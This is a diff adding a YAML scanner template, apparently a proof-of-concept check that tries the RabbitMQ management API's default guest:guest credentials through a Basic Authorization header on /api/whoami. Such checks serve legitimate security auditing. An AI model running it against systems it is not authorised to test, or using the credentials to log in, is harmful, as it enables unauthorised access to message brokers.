@@ -1,0 +1,23 @@
+detail:
+  author: mumu0215(https://github.com/mumu0215)
+  links:
+  - http://luckyzmj.cn/posts/15dff4d3.html
+expression: r0() && r1()
+manual: true
+name: poc-yaml-rabbitmq-default-password
+rules:
+  r0:
+    expression: response.status == 401
+    request:
+      cache: true
+      method: GET
+      path: /api/whoami
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b"\"name\":\"guest\"")
+    request:
+      cache: true
+      headers:
+        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+      method: GET
+      path: /api/whoami
+transport: http
